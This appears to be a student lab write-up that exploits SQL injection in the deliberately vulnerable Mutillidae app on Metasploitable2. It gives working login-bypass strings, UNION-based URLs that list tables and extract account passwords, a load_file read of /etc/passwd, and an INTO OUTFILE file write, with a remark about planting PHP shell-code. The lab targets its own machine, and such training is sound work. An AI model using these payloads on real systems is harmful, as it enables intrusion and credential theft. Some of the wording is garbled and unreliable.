# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/139001aa-7611-452b-86c2-731b505d0aad)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/26deaa8c-e030-4745-9564-463a71d09e51)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/19854045-b8b4-46df-a677-09d2d0b1122b)
Click on the menu Login/Register and register for an account
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/ec90e413-aa43-4a7e-93cf-3b576ad6b7a6)
Click on the link “Please register here”
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/50155c8c-666c-43a6-ae05-0233e24cd7e2)
Click on “Create Account” to display the following page:
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/7b9ea77d-2014-4303-bad4-56a7bde442ce)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/96606a1a-75e3-4a4e-9c62-19efd0f86d5b)
Click “Login”. The logged in page will show as below:
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/5e392db6-2a11-4c1f-9274-a4effe3a394f)
##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/9cf4436f-d124-45a8-a342-89d5a28d5665)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/4f4067dd-cc35-40ba-8e15-54f185390438)
## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/7f84b9aa-236d-471e-8281-4c38fafc9fcb)
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/2d1f9c52-988d-4b07-9d80-e57a850700be)
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/10bfcb45-877a-4229-9c77-452966c71d0b)
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/f451757f-f645-46ec-8732-240080a0c888)
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/06508141-d833-4a94-ada2-bd07c60bff54)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/b98b1e09-e8b2-41e7-b0b0-399ddac46234)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/e62e35d6-ad57-4b3b-b515-52529ab1ae9f)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/07bf591c-c58e-44d5-9c3d-1497c5e13dee)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/1e84fc8c-1dec-4520-aac1-816e59dc5ae1)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/33c74a15-6d8b-47ff-8d19-9cf5a1a5a791)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/47c3a7ee-da89-458c-b8a5-f12f94050470)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/eaeb065f-9b66-487c-ac09-40b23bbe69a9)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/544fc61e-1cfd-4592-a629-920d3141ccfe)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/e251203d-72e7-4f38-af47-e544e50a270a)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/ef276642-16e1-490b-8b85-7b7e2209d0be)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Shobika187/sqlinjection/assets/94508142/ed67b358-c74d-4654-a84c-bcc6526a1dbc)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/f39a2b91-0616-429c-ad94-4dfd5891557f)
Screenshot 2023-06-10 225759
Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Shobika187/sqlinjection/assets/94508142/aa526214-41c0-414c-aaf6-21f2856f128c)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
